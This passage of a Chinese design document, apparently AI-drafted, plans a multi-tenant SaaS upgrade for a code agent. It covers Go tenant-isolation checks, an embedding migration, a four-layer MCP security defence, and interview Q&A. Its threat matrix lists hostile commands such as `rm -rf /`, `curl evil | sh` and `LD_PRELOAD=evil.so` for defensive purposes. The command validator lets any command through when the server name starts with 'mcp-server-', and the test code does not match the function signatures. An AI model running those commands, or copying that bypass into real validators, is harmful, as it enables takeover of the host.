func (f *Factory) Get(ctx context.Context, userID string) (*UserServices, error) {
    ctxUserID, ok := ctx.Value(CtxUserID).(string)
    if !ok || ctxUserID == "" {
        return nil, errors.New("factory: missing ctx user_id")
    }
    if userID != ctxUserID {
        return nil, fmt.Errorf("factory: caller/userID mismatch (%q vs %q)", userID, ctxUserID)
        // 任何工具绕过 ctx 拿别人的服务 → 立刻拒绝
    }
    // ... cache lookup
}

// MCP Manager / SSH Pool / Qdrant Search 同款断言
// 每服务都内嵌 `s.requireUserID(ctx)` helper
func (s *UserServices) requireUserID(ctx context.Context) error {
    want := s.userID
    got, _ := ctx.Value(CtxUserID).(string)
    if got != want {
        return ErrTenantMismatch  // 在关键路径 panic（开发）/ 返错（生产）
    }
    return nil
}
```

#### 防线 3：e2e 测试覆盖（§6 Sprint 1.7 + §6 Sprint 4.1）
```go
// test/e2e/tenant_test.go
func TestTenantIsolation(t *testing.T) {
    userA := registerUser(t, "a@example.com")
    userB := registerUser(t, "b@example.com")
    sessionA := createSession(t, userA, "secret A")

    // 用 userB 的 token 访问 userA 的 session
    resp := mustGet(t, "/api/v1/sessions/"+sessionA.ID, tokenB)
    assert.Equal(t, 404, resp.StatusCode) // 故意不返 403 防枚举

    // 用 userB 的 ctx 调 userA 的 MCP
    _, err := factory.Get(ctxWithUserB).MCP.CallTool(ctx, "tool", args)
    assert.ErrorIs(t, err, ErrTenantMismatch)
}
```

### 8.6 Embedding 模型升级流程（Qdrant collection 版本演进）

**场景**：项目从 OpenAI `text-embedding-3-small` (1536 维) 升级到 `text-embedding-3-large` (3072 维) 或换 BGE-m3 (1024 维)，历史数据迁移。

**五步流程（"双写 → 回填 → 切流 → 灰度 → 退役"）**：

```yaml
# configs/config.yaml
vector:
  qdrant:
    collections:
      primary: "memories_openai_3l_3072"   # 新（默认读）
      legacy:   "memories_openai_3s_1536"   # 旧（fallback 读）
    dual_write:
      enabled: true                          # Save 时同时写两个 collection
      on_primary_failure: "fail"             # fail | fallback_legacy
    cutover:
      enabled: false                          # true 后 Search 只查 primary
      progress_pct: 0                         # 0-100, 监控回填进度
      rollback_enabled: true                  # 切回 legacy 时一键回滚
```

**步骤 1（双写开启）**：部署时把 `dual_write.enabled=true` 上线，所有 `Save(memory)` 同时写 `primary` + `legacy` 两个 collection。**Search 仍只读 primary**（暂不变）——目的是让新数据立刻进入新 collection。

**步骤 2（历史回填）**：Sprint 4 后期写 `cmd/backfill/main.go`：
- 从 MySQL 拉 `embedding IS NOT NULL` 的所有 memory，按 user_id 分批（避免单 batch 超限）
- 用**新 embedding model** 重 embed；写入 `primary` collection
- 进度写到 Redis：`cutover.progress_pct`
- **保留 legacy 完整不动**（回滚用）

**步骤 3（切流到 primary）**：回填进度 = 100% 后：
- 改 config：`dual_write.enabled=true`（保留）+ 新加 `cutover.enabled=true`
- Search 只查 `primary`，**legacy 仅在 primary 故障时 fallback**
- 灰度：先 internal user 灰度 1 周 → 再扩所有

**步骤 4（监控回填盲点）**：
- 在 OTel 加 `memory.primary_hit_count`、`memory.legacy_fallback_count`
- Grafana 看板：3 天内 primary_hit_count 占比应 > 99%，否则人工检查
- 跨 collection 一致性 check：抽样 1000 条 `id`，确认两边 embedding 都在

**步骤 5（退役 legacy）**：
- 监控 1 个月无 fallback 触发 → `dual_write.enabled=false`
- 调用 Qdrant REST `DELETE /collections/memories_openai_3s_1536`
- 同时删除 MySQL 中对应 `embedding` 列（如果只为旧 dim 存）

**回滚方案**：任何阶段发现异常 → `cutover.rollback_enabled=true` 一行切回 legacy；或改 config `dual_write.on_primary_failure=fallback_legacy` 让 Search 自动回落。

**对 `IVectorIndex` 接口的影响**：`EnsureCollection` 接受 `(name, dim)`，**多 collection 自然兼容**；`Search` 接收 `collection` 参数；Factory 层 config 决定实际选 `primary`。

### 8.7 用户 MCP 配置安全四层防护（Sprint 2.5 落地）

**核心威胁**：SaaS 后用户可任意配 stdio MCP server，等于"在宿主机以 Agent 权限跑任意子进程 + 接任意内网"——比 SSH 凭据明文更危险。

#### 防护 1：command 白名单
```go
// internal/proxy/mcp_validator.go（domain 不感知，放 infrastructure）
var allowedCommandPrefixes = []string{
    "uvx",         // Python 包运行器
    "npx",         // Node 包运行器（必须配白名单包名）
    "docker",      // 容器化 MCP server
    "podman",
    "code-agent-mcp",  // 我们自家二进制
}
// server 名带 "mcp-server-" 前缀则不限制 command（社区公认）
var allowedMCPServerPrefix = "mcp-server-"

func validateCommand(name, command string) error {
    if strings.HasPrefix(name, allowedMCPServerPrefix) {
        return nil
    }
    for _, p := range allowedCommandPrefixes {
        if command == p || strings.HasPrefix(command, p+" ") {
            return nil
        }
    }
    return fmt.Errorf("command %q not in whitelist", command)
}
```

#### 防护 2：env 变量名白名单
```go
var allowedEnvKeyPattern = regexp.MustCompile(`^[A-Z][A-Z0-9_]*_(TOKEN|KEY|SECRET|URL|HOST|PORT|ENDPOINT|USER|PASSWORD|PATH)$`)
// 例：允许 GITHUB_TOKEN / OPENAI_API_KEY / DATABASE_URL / MY_HOST
// 例：拒绝 LD_PRELOAD / LD_LIBRARY_PATH / HOME / PATH（防劫持）

func validateEnv(env map[string]string) error {
    for k := range env {
        if !allowedEnvKeyPattern.MatchString(k) {
            return fmt.Errorf("env key %q not allowed", k)
        }
    }
    return nil
}
```

#### 防护 3：SSRF 防护（URL 白名单 + 内网 IP 拒绝 + DNS 二次校验）
```go
var blockedCIDRs = []*net.IPNet{
    mustCIDR("10.0.0.0/8"),
    mustCIDR("172.16.0.0/12"),
    mustCIDR("192.168.0.0/16"),
    mustCIDR("169.254.0.0/16"),  // AWS/cloud metadata
    mustCIDR("127.0.0.0/8"),      // 本机
    mustCIDR("::1/128"),
}

func validateURL(ctx context.Context, rawURL string) error {
    u, err := url.Parse(rawURL)
    if err != nil { return err }
    if u.Scheme != "http" && u.Scheme != "https" { return errors.New("scheme") }
    host := u.Hostname()
    ips, err := net.DefaultResolver.LookupIPAddr(ctx, host)  // DNS 解析
    if err != nil { return err }
    for _, ip := range ips {
        for _, blocked := range blockedCIDRs {
            if blocked.Contains(ip.IP) {
                return fmt.Errorf("url %s resolves to blocked %s", host, ip)
            }
        }
    }
    return nil
}
```

#### 防护 4：stdio 进程沙箱执行
复用 §1.4 bash 沙箱基础设施 + stdio MCP 特定加固：
```go
func sandboxedStdioCmd(ctx context.Context, cfg ServerConfig) *exec.Cmd {
    cmd := exec.CommandContext(ctx, cfg.Command, cfg.Args...)
    cmd.Env = filterEnv(cfg.Env)  // 走防护 2 白名单

    // Linux/macOS: namespace 隔离
    if runtime.GOOS != "windows" {
        cmd.SysProcAttr = &syscall.SysProcAttr{
            Cloneflags: syscall.CLONE_NEWUSER | syscall.CLONE_NEWPID | syscall.CLONE_NEWNS,
            UidMappings: []syscall.SysProcIDMap{
                {ContainerID: 0, HostID: os.Getuid(), Size: 1},  // 映射到低权限 UID
            },
        }
    }
    return cmd
}
```

#### Web 端体验流
```
用户在 "MCP" 页点"+ 添加"
  → 前端先 POST /api/v1/mcp/test {command, args, env, url}  ← "测试连通"
    → 后端走四层校验 → 真跑 ListTools 1 次 → 返 {ok: true, tools: [...]} 或详细错误
  → 用户确认后再 POST /api/v1/mcp/servers 保存
    → 校验 + 落 user_mcp_servers + 失效 Factory 缓存
  → 下次 Agent run 自动加载
```

#### 4 层防护的覆盖矩阵
| 攻击向量 | 防护 1 (cmd 白名单) | 防护 2 (env 白名单) | 防护 3 (SSRF) | 防护 4 (沙箱) |
|---|---|---|---|---|
| `rm -rf /` | ✅ | – | – | ✅ (pids-limit) |
| `bash -c 'curl evil | sh'` | ✅ | – | – | ✅ |
| `LD_PRELOAD=evil.so` | – | ✅ | – | ✅ (namespace) |
| `url=http://169.254.../iam` | – | – | ✅ | – |
| `args: ["-y", "evil-package"]` | ✅ (npx 需配白名单包名) | – | – | – |
| 进程写 `/etc/passwd` | – | – | – | ✅ (mount namespace) |
| 进程读其他用户 workspace | – | – | – | ✅ (磁盘只读 mount) |

---

## 9. 风险与缓释

| 风险 | 缓释 |
|---|---|
| fosite 学习曲线陡 | 直接抄其 `fosite-example` 中 Device Flow 子例（~250 行） |
| 前端写 SPA 时间多 | shadcn copy-paste + Vite + React Query，6 页实写 < 3 天 |
| LLM 代理层遇供应商限流 | 代理层加重试 + circuit breaker |
| 凭据 KMS 集成复杂 | Phase 1 用本地 file-based master key（AES-GCM，30 行），生产再切 Vault |
| 多租户越权漏洞 | Sprint 1.7 + Sprint 4.1 双保险，每层"user_id 强制注入"测试 |
| CORS 配置复杂 | 用现有 `cors_origins`，开发 `*` 生产绑特定 origin |
| SaaS 域名 / 邮件 / 备案 | 不阻塞开发，先 127.0.0.1 + mailcatcher 演示；上线再买域名 |
| SSH 凭据 KMS | Sprint 3.6 同步修，复用 LLM Key 的 KMS 基础设施 |
| Qdrant 挂了 | 自动 fallback 到 MySQL brute-force + Prometheus 告警 + BackfillVector 恢复后补 |
| ULID vs UUID | 用 ULID（26 字符 base32，时间排序友好），引入 `oklog/ulid/v2` |

---

## 10. 面试可讲的故事（直接进 §31 候选）

### Q1：怎么把单用户工具升级成多租户 SaaS？
> 在 Auth() 与 ChatApp() 之间插一层（Auth Gateway + Tenant Context + Per-User Service Factory），所有现有业务 80% 不动，只把 user_id 从"客户端自报字符串"改成"从 JWT ctx 强制注入"。**复用优先 + 接口先行 + 容错回退**。

### Q2：为什么选 OAuth2 + Device Flow？
> TUI 是无浏览器/低输入场景，PKCE 不合适；Device Flow 是 RFC8628 标准，GitHub CLI、gcloud、aws sso 都用；fosite 开箱提供，~250 行能落地。

### Q3：TUI 怎么防 token 被偷？
> 文件 chmod 700、可选 DPAPI/`systemd-creds` 加密、refresh_token 轮换、device 撤销机制、refresh 单点撤销表。

### Q4：LLM Key 怎么不落到 TUI ？
> TUI 发对话请求到后端（JWT 鉴权）→ 后端按 user_id 取加密的 key → 用后端 OpenAI 兼容 client 调上游 → SSE 流式透传。**TUI 只接触 JWT**。

### Q5：为什么从 JSON 存 embedding 迁到 Qdrant？
> O(N) 单 user 慢、O(N²) 多用户并发不可接受。Qdrant HNSW 索引降到 O(log N)，单 QPS 千级毫秒级返回；MySQL 仍是 source of truth，Qdrant 只管向量+payload，故障 fallback 不丢可用性。

### Q6：Qdrant 怎么防越权？
> 1. 单 collection + payload 强 filter 强制注入 user_id；2. 适配器层 Search 前断言 filter 必有 user_id，缺失 panic；3. e2e 测试用户 A 取不到用户 B 任何 hit。

### Q7：多租户数据怎么 100% 隔离？
> 强制 ctx.user_id + 所有 SQL `WHERE user_id = ?` + 全表越权 e2e 测试 + lint 规则禁止裸 `List()`。

### Q8：为什么不直接用 Supabase/Auth0？
> 学习成本 + 失去定制空间 + SaaS 锁定 + 项目级 LLM 代理无法做；自写 fosite 30 行够用，且可塞面试深挖。

### Q9：升级期间怎么保证现有 demo 不挂？
> Sprint 1 一上来就完成 1.1-1.4，让 demo 既支持新 JWT 也支持旧 dev-key（**已确认不走灰度，直接 JWT 单轨**）；Sprint 1.6 改造 ctx 时旧路径测试不跑即可，新用户走 JWT 流。

### Q10：限流 / 配额 / 审计三件套怎么落地？
> 多级 Redis 限流（IP/device/user/org）+ 用户日 token 配额（每次调 LLM 前查 + 调后累加）+ 审计写入现有 audit_log（带 org_id/user_id/device_id），Grafana 看板看 QPS/错误率/超时/消耗。

### Q11：SaaS 让用户在 Web 配置 MCP server，等于开后门吗？
> **是 P0 风险**——stdio MCP 让用户在 Agent 宿主机跑任意子进程 + 接任意内网，**比 SSH 凭据明文还危险**。**四层防护**（§8.7）：① command 白名单（`uvx`/`npx`/`docker`/`mcp-server-*` 前缀）；② env 变量名白名单（只接受 `*_TOKEN`/`*_KEY`/`*_URL` 等语义名，拒绝 `LD_PRELOAD`/`HOME`/`PATH`）；③ SSRF 防护（URL 禁内网 IP 段 + DNS 二次校验）；④ stdio 沙箱（`unshare -U` namespace + pids-limit + 磁盘只读 mount）。Web 端先"测试连通"再保存。

### Q12：SaaS 后 MCP 客户端要换成 SDK 吗？
> **现在不换**——Sprint 1-3 仍手搓 JSON-RPC（仅 4 个 RPC 不值当背 SDK 依赖；多租户改造 SDK 帮不上忙）。**Sprint 4.8 做"二选一"评估**，触发条件：① 客户要 resources/prompts/sampling；② 接 >20 个第三方 MCP server 需统一 transport+OAuth；③ MCP 协议大版本演进；④ 团队维护成本。架构已隔离在 `IMCPClient` 接口，将来切 SDK 是换实现不换骨架；建议 Sprint 4.8 引入 SDK 作为"可选适配层"（按 user/config 选 native vs SDK）。

---

## 11. 待你确认 / 不确定项

- [ ] **域名 / 邮箱服务**：用现成公网域名 + 腾讯云企业邮，还是先用 mailcatcher 演示？
- [x] ~~**是否在 Sprint 3.6 同步修 SSH 凭据明文漏洞**~~ → 已提前到 Sprint 2.9（与 LLM Key KMS 同基础设施）
- [ ] **是否先写本文件给面试官看，再开干**：还是直接进 Sprint 1.1-1.12
- [ ] **OpenAPI/Swagger 是否引入**：建议是（前端代码生成 + 面试加分），但非阻塞
- [x] ~~**多租户 vs 多组织（org）边界**~~ → 已采用 forward-compat：MVP 单 user 单 org + 空 `org_members` 表，未来启团队邀请只需数据迁移 +1 字段变更
- [ ] **是否接 SSO（OIDC/SAML）**：企业客户场景才需要；MVP 跳过
- [ ] **Lint 工具选型**：`grep + CI`（轻量）vs `golangci-lint custom analyzer`（重但更强）vs `go vet 自写插件`（标准但门槛高）？建议 Sprint 1.7 用 grep 起步，后期换 analyzer
- [ ] **Embedding 模型双写期长度**：MVP 用 `text-embedding-3-small`，什么时候切 `text-embedding-3-large` 或 BGE？建议**至少**保留 1 个月回退窗口
- [ ] **MCP SDK Sprint 4.8 评估**：是 Sprint 4 末做"二选一"决策，还是上线后再评估？建议 Sprint 4 末做（避免上线后背着改造债）
- [ ] **stdio MCP 沙箱**：用 `unshare -U`（轻量，Linux/macOS）还是 `docker exec`（重但跨平台）？MVP 建议 `unshare` + Windows 走 Job Object 进程隔离

---

## 12. 变更日志

| 日期 | 变更 | 作者 |
|---|---|---|
| 2026-08-19 | v0.1 初稿：基于 Phase A 升级审计 + SaaS 路线图整合 | AI 起草 |
| 2026-08-19 | v0.2 review 修订：①§1.2.11 新增 MCP Manager 全局单例越权漏洞（P0）；②§4 新增 `org_members` 预留表 + forward-compat 切换路径；③Sprint 1.6 +0.5 d（MCP per-user 化）；④Sprint 2.9 提前 SSH KMS、Sprint 2.10 KMS 测试；⑤Sprint 3.6/3.7 调整为 TUI 凭据本地加密 + 跨设备撤销；⑥新增 §8.5 静态+运行时租户守门人三防线；⑦新增 §8.6 embedding 模型升级五步流程 | AI 修订（基于用户 review） |
| 2026-08-19 | v0.3 review 修订：①§1.2.12 新增"用户配 stdio MCP 等于开后门"P0 漏洞；②§3 MCP SDK 重评估（暂不换、Sprint 4.8 二选一）；③§6 Sprint 2.5 由 1.5d → 2.5d（+1.0d 用户 MCP 安全 4 层防护）；④新增 Sprint 4.7 Qdrant 越权测试、Sprint 4.8 MCP SDK 评估；⑤新增 §8.7 用户 MCP 配置安全四层防护（command 白名单 + env 白名单 + SSRF + stdio namespace 沙箱）；⑥新增 §10 Q11-Q12（用户 MCP 开后门 / SDK 评估）；⑦§11 新增 3 待确认项（MCP SDK 评估时机 / stdio 沙箱方案） | AI 修订（基于用户 review） |

---

*本文档基于项目真实代码（`internal/`、`scripts/sql/01_schema.sql`、`docker-compose.yml`、`configs/`）+ 开源组件成熟度调研整理。落地时所有"实现细节"应与代码一致；凡标注"待你确认"之处，按用户答复更新。*